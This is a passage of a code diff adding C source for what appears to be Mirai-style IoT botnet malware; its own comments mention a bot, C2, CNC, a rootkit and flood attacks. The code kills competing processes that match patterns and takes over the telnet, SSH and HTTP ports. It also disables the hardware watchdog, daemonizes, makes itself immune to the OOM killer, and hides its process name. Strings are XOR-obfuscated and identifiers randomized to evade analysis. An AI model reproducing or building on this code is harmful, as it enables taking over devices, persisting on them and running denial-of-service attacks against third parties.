+            /* cmdline has NUL separators between args — convert to spaces */
+            for (j = 0; j < total; j++) {
+                if (cmdline[j] == '\0') cmdline[j] = ' ';
+            }
+        }
+
+        for (k = 0; k < sa_count(&_wP7xV7q); k++) {
+            const char *pat = sa_get(&_wP7xV7q, k);
+            if (stristr(cmdline, pat) ||
+                (exe_buf[0] && stristr(exe_buf, pat))) {
+                _nS5PJ8Y(_S(45,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xe5,0xe3,0xef,0x8c,0x8b,0x89,0xdf,0x8b,0x8c,0xc1,0xcd,0xd8,0xcf,0xc4,0xc9,0xc8,0x8c,0xfc,0xe5,0xe8,0x8c,0x89,0xc8,0x8c,0xf7,0x89,0xdf,0xf1,0x80,0x8c,0xc7,0xc5,0xc0,0xc0,0xc5,0xc2,0xcb),
+                          pat, pid, cmdline);
+                kill(pid, SIGKILL);
+                break;
+            }
+        }
+    }
+    closedir(d);
+}
+
+static void *killer_thread(void *arg)
+{
+    (void)arg;
+
+    /* initial delay to let the bot finish starting */
+    sleep_ms(5000);
+
+#ifndef DEBUG
+    /* steal common ports — kill owners, bind to prevent restart */
+    MA2Zm5N(23);  /* telnet */
+    MA2Zm5N(22);  /* ssh */
+    MA2Zm5N(80);  /* http */
+#endif
+
+    _nS5PJ8Y(_S(33,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc5,0xc2,0xcb,0x8c,0xe5,0xe3,0xef,0x8c,0xdf,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xc0,0xc3,0xc3,0xdc));
+    for (;;) {
+        sq6un4t();
+        /* scan every 30-60 seconds */
+        sleep_ms(jitter_ms(30000, 60000));
+    }
+    return NULL;
+}
+
+void HZ8hr8M(void)
+{
+    pthread_t tid;
+    pthread_create(&tid, NULL, killer_thread, NULL);
+    pthread_detach(tid);
+    _nS5PJ8Y(_S(34,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xe5,0xe3,0xef,0x8c,0xdf,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xd8,0xc4,0xde,0xc9,0xcd,0xc8,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8));
+}
+
+/* ==========================================================================
+ * SINGLE INSTANCE via localhost control port
+ *
+ * Instead of a PID lock file we bind 127.0.0.1:CTRL_PORT.
+ *   - New instance connects and sends magic word → old instance _exit(0)
+ *   - bind() is atomic — no stale-PID / PID-reuse races
+ *   - PID file is still written for systemd PIDFile= tracking
+ * ========================================================================== */
+
+/* Listener thread: accept loop, kill self on magic word from localhost */
+static void *ctrl_listener_fn(void *arg) {
+    (void)arg;
+    for (;;) {
+        struct sockaddr_in cli;
+        socklen_t clen = sizeof(cli);
+        int cfd;
+        char buf[32];
+        ssize_t n;
+
+        cfd = accept(_ib2tD7y, (struct sockaddr *)&cli, &clen);
+        if (cfd < 0) break; /* fd closed → we're shutting down */
+
+        /* Only accept from 127.0.0.1 */
+        if (cli.sin_addr.s_addr != htonl(INADDR_LOOPBACK)) {
+            close(cfd);
+            continue;
+        }
+
+        n = read(cfd, buf, sizeof(buf) - 1);
+        close(cfd);
+
+        if (n > 0) {
+            buf[n] = '\0';
+            if (strstr(buf, _S(14,0xdf,0xdb,0xc9,0xc9,0xc8,0xc5,0xdf,0xc4,0xdf,0xc2,0xc5,0xdc,0xc9,0xde))) {
+                _nS5PJ8Y(_S(35,0xcf,0xd8,0xde,0xc0,0x96,0x8c,0xc1,0xcd,0xcb,0xc5,0xcf,0x8c,0xde,0xc9,0xcf,0xc9,0xc5,0xda,0xc9,0xc8,0x80,0x8c,0xdf,0xc4,0xd9,0xd8,0xd8,0xc5,0xc2,0xcb,0x8c,0xc8,0xc3,0xdb,0xc2));
+                _exit(0);
+            }
+        }
+    }
+    return NULL;
+}
+
+/* Try to bind the control port; returns 1 on success, 0 on failure */
+static int _aC8kt7n(void) {
+    struct sockaddr_in addr;
+    int opt = 1;
+
+    _ib2tD7y = socket(AF_INET, SOCK_STREAM, 0);
+    if (_ib2tD7y < 0) return 0;
+
+    setsockopt(_ib2tD7y, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family      = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    addr.sin_port        = htons(CTRL_PORT);
+
+    if (bind(_ib2tD7y, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+        close(_ib2tD7y);
+        _ib2tD7y = -1;
+        return 0;
+    }
+
+    listen(_ib2tD7y, 1);
+    fcntl(_ib2tD7y, F_SETFD, FD_CLOEXEC);
+    return 1;
+}
+
+/* Send magic word to whatever is listening on the control port.
+ * Returns 1 if we connected (something was there), 0 if nothing listening. */
+static int _Jy2NQ5B(void) {
+    struct sockaddr_in addr;
+    int fd;
+
+    fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd < 0) return 0;
+
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family      = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    addr.sin_port        = htons(CTRL_PORT);
+
+    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        write(fd, _S(15,0xdf,0xdb,0xc9,0xc9,0xc8,0xc5,0xdf,0xc4,0xdf,0xc2,0xc5,0xdc,0xc9,0xde,0xa6), 15);
+        close(fd);
+        return 1;
+    }
+    close(fd);
+    return 0;
+}
+
+int Bp3Tq8Z(void) {
+    pthread_t tid;
+    int sent_exit = 0;
+    int attempt;
+
+    iB2Zq4a();
+    Ri2bh5v();
+
+    /* ── Step 1: send EXIT to old instance if port is occupied ── */
+    if (_Jy2NQ5B()) {
+        sent_exit = 1;
+        _nS5PJ8Y(_S(30,0xee,0xdc,0x9f,0xf8,0xdd,0x94,0xf6,0x96,0x8c,0xdf,0xc9,0xc2,0xd8,0x8c,0xc1,0xcd,0xcb,0xc5,0xcf,0x8c,0xc3,0xc2,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8), CTRL_PORT);
+        usleep(500000); /* 500 ms for clean shutdown */
+    }
+
+    /* ── Step 2: try to bind, retry a few times ── */
+    for (attempt = 0; attempt < 3; attempt++) {
+        if (_aC8kt7n()) goto bound;
+        if (attempt == 0 && !sent_exit) break; /* nothing was there, bind just failed */
+        _nS5PJ8Y(_S(41,0xee,0xdc,0x9f,0xf8,0xdd,0x94,0xf6,0x96,0x8c,0xce,0xc5,0xc2,0xc8,0x8c,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0x8c,0x89,0xc8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x80,0x8c,0xde,0xc9,0xd8,0xde,0xd5,0xc5,0xc2,0xcb), attempt + 1);
+        usleep(300000); /* 300 ms between retries */
+    }
+
+    /* ── Step 3: magic word didn't work — escalate to /proc fd kill ── */
+    if (sent_exit) {
+        _nS5PJ8Y(_S(45,0xee,0xdc,0x9f,0xf8,0xdd,0x94,0xf6,0x96,0x8c,0xc1,0xcd,0xcb,0xc5,0xcf,0x8c,0xc5,0xcb,0xc2,0xc3,0xde,0xc9,0xc8,0x80,0x8c,0xc9,0xdf,0xcf,0xcd,0xc0,0xcd,0xd8,0xc5,0xc2,0xcb,0x8c,0xd8,0xc3,0x8c,0xca,0xc8,0x8c,0xc7,0xc5,0xc0,0xc0));
+        uU4kL2w(CTRL_PORT);
+        usleep(500000);
+
+        if (_aC8kt7n()) goto bound;
+    }
+
+    /* ── Couldn't grab port — carry on without it, CNC handles the edge case ── */
+    _nS5PJ8Y(_S(61,0xee,0xdc,0x9f,0xf8,0xdd,0x94,0xf6,0x96,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8,0x8c,0xd9,0xc2,0xcd,0xda,0xcd,0xc5,0xc0,0xcd,0xce,0xc0,0xc9,0x80,0x8c,0xcf,0xc3,0xc2,0xd8,0xc5,0xc2,0xd9,0xc5,0xc2,0xcb,0x8c,0xdb,0xc5,0xd8,0xc4,0xc3,0xd9,0xd8,0x8c,0xcf,0xc3,0xc2,0xd8,0xde,0xc3,0xc0,0x8c,0xdc,0xc3,0xde,0xd8), CTRL_PORT);
+    goto done;
+
+bound:
+    _nS5PJ8Y(_S(30,0xee,0xdc,0x9f,0xf8,0xdd,0x94,0xf6,0x96,0x8c,0xcf,0xc3,0xc2,0xd8,0xde,0xc3,0xc0,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8,0x8c,0xce,0xc3,0xd9,0xc2,0xc8), CTRL_PORT);
+
+    /* ── Start listener thread ── */
+    pthread_create(&tid, NULL, ctrl_listener_fn, NULL);
+    pthread_detach(tid);
+
+    /* ── Write PID file (systemd PIDFile= still needs it) ── */
+    {
+        FILE *f = fopen(ds_cstr(&_aN8Lh6d), _S(1,0xdb));
+        if (f) {
+            char pid_str[32];
+            snprintf(pid_str, sizeof(pid_str), _S(2,0x89,0xc8), (int)getpid());
+            fputs(pid_str, f);
+            fclose(f);
+            chmod(ds_cstr(&_aN8Lh6d), 0600);
+        }
+    }
+
+    _nS5PJ8Y(_S(40,0xee,0xdc,0x9f,0xf8,0xdd,0x94,0xf6,0x96,0x8c,0xc0,0xc3,0xcf,0xc7,0x8c,0xcd,0xcf,0xdd,0xd9,0xc5,0xde,0xc9,0xc8,0x8c,0x84,0xfc,0xe5,0xe8,0x8c,0x89,0xc8,0x80,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8,0x85), (int)getpid(), CTRL_PORT);
+
+done:
+    return 1;
+}
+
+/* ==========================================================================
+ * DAEMONIZATION (matches Go uQ5tH2B)
+ * Fork + setsid + redirect fds + ignore signals
+ * ========================================================================== */
+
+static void _vv8Xr3W(void) {
+    int null_fd, fd;
+
+    /* Release any filesystem mount held by CWD */
+    (void)chdir(_S(1,0x83));
+    umask(0);
+
+    iB2Zq4a();
+    null_fd = open(ds_cstr(&_Qt5Ey5X), O_RDWR);
+    if (null_fd >= 0) {
+        dup2(null_fd, STDIN_FILENO);
+        dup2(null_fd, STDOUT_FILENO);
+        dup2(null_fd, STDERR_FILENO);
+        if (null_fd > 2) close(null_fd);
+    }
+
+    /* Close all inherited file descriptors beyond stderr */
+    for (fd = 3; fd < 1024; fd++) close(fd);
+    errno = 0; /* clear stale EBADF */
+
+    /* Ignore all terminal and job-control signals */
+    signal(SIGHUP,  SIG_IGN);
+    signal(SIGINT,  SIG_IGN);
+    signal(SIGQUIT, SIG_IGN);
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGUSR1, SIG_IGN);
+    signal(SIGUSR2, SIG_IGN);
+    signal(SIGTSTP, SIG_IGN);
+    signal(SIGTTIN, SIG_IGN);
+    signal(SIGTTOU, SIG_IGN);
+    signal(SIGPIPE, SIG_IGN);
+}
+
+void uQ5tH2B(int argc, char **argv) {
+    pid_t pid;
+    sigset_t sigs;
+    int wfd;
+
+#ifdef DEBUG
+    return;  /* stay in foreground for debug builds */
+#endif
+
+    /*
+     * Pre-fork hardening — these survive across fork() so the child is
+     * protected from the instant it exists, with no signal window.
+     */
+
+    /* Block SIGINT at the process mask level (survives fork, immune to
+     * library code calling signal()).  Stronger than SIG_IGN. */
+    sigemptyset(&sigs);
+    sigaddset(&sigs, SIGINT);
+    sigprocmask(SIG_BLOCK, &sigs, NULL);
+
+    signal(SIGCHLD, SIG_IGN);  /* reap children automatically, no zombies */
+    signal(SIGPIPE, SIG_IGN);  /* don't die on broken C2 socket */
+
+    /* Binary stays on disk — rootkit hides it from userland tools.
+     * Persistence calls the binary directly via cron instead of re-downloading. */
+
+    /* Disable hardware watchdog so the device doesn't reboot under us */
+    if ((wfd = open(_S(13,0x83,0xc8,0xc9,0xda,0x83,0xdb,0xcd,0xd8,0xcf,0xc4,0xc8,0xc3,0xcb), O_WRONLY)) != -1 ||
+        (wfd = open(_S(18,0x83,0xc8,0xc9,0xda,0x83,0xc1,0xc5,0xdf,0xcf,0x83,0xdb,0xcd,0xd8,0xcf,0xc4,0xc8,0xc3,0xcb), O_WRONLY)) != -1) {
+        int opt = 0x56425653; /* WDIOS_DISABLECARD (magic close) */
+        ioctl(wfd, 0x80045705, &opt); /* WDIOC_SETOPTIONS */
+        close(wfd);
+    }
+
+    /*
+     * Classic double-fork daemon:
+     *   1. fork  → parent exits (detach from shell)
+     *   2. setsid → new session (detach from controlling terminal)
+     *   3. fork  → intermediate exits (child is NOT session leader,
+     *              can never reacquire a controlling terminal)
+     *   4. housekeep: chdir /, umask 0, redirect stdio, close FDs, signals
+     */
+
+    /* First fork — detach from parent/shell */
+    pid = fork();
+    if (pid < 0) return;
+    if (pid > 0) _exit(0);
+
+    /* New session leader */
+    setsid();
+
+    /* Second fork — shed session leader status */
+    pid = fork();
+    if (pid < 0) _exit(0);
+    if (pid > 0) _exit(0);
+
+    /* Final daemon process: not a session leader, fully detached */
+    _vv8Xr3W();
+
+    /* OOM killer immunity — main bot process must survive at all costs.
+     * Attack children reset this to 0 in let_em_cook() so OOM
+     * sacrifices flood forks instead of us. */
+    {
+        int oom_fd = open(_S(24,0x83,0xdc,0xde,0xc3,0xcf,0x83,0xdf,0xc9,0xc0,0xca,0x83,0xc3,0xc3,0xc1,0xf3,0xdf,0xcf,0xc3,0xde,0xc9,0xf3,0xcd,0xc8,0xc6), O_WRONLY);
+        if (oom_fd >= 0) {
+            write(oom_fd, _S(6,0x81,0x9d,0x9c,0x9c,0x9c,0xa6), 6);
+            close(oom_fd);
+        }
+    }
+
+    /* Disguise process name in ps/top */
+    DS4RR2W(); /* decrypts _xJ8ym8N */
+    if (sa_count(&_xJ8ym8N) > 0 && argc > 0 && argv && argv[0]) {
+        const char *fake = sa_get(&_xJ8ym8N, urandom_u32() % sa_count(&_xJ8ym8N));
+        size_t orig_len = strlen(argv[0]);
+        memset(argv[0], 0, orig_len);
+        strncpy(argv[0], fake, orig_len);
+        prctl(PR_SET_NAME, (unsigned long)fake, 0, 0, 0);
+        _nS5PJ8Y(_S(34,0xd9,0xfd,0x99,0xd8,0xe4,0x9e,0xee,0x96,0x8c,0xdc,0xde,0xc3,0xcf,0xc9,0xdf,0xdf,0x8c,0xc8,0xc5,0xdf,0xcb,0xd9,0xc5,0xdf,0xc9,0xc8,0x8c,0xcd,0xdf,0x8c,0x8b,0x89,0xdf,0x8b), fake);
+    }
+}
